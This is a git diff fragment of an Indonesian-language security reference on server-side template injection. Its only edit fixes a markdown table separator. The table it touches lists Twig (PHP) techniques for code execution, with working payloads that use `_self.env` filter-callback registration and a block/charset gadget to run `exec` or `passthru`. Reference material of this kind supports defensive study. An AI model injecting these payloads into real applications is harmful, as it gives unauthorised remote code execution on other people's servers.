@@ -157,7 +157,7 @@ FreeMarker menyediakan beberapa built-in function yang mengaktifkan code executi
 Twig (PHP) menyediakan environment default yang lebih restricted, tetapi beberapa built-in feature dapat di-chain untuk code execution.
 
 | Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|
+|---|---|---|---|
 | **`_self` environment access** | `_self.env` mengakses object Twig Environment, mengaktifkan method call | Twig < 2.x (deprecated dalam versi later) | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` |
 | **`filter()` callback registration** | Register arbitrary PHP function sebagai Twig filter callback | Akses ke environment object atau `getFilter()` | Register `system` sebagai callback, kemudian panggil via filter |
 | **Block/charset gadget** | Abuse `{%block%}` dan `_charset` built-in untuk command construction | Twig rendering context | `{%block U%}id000passthru{%endblock%}{%set x=block(_charset\|first)\|split(000)%}{{ [x\|first]\|map(x\|last)\|join }}` |
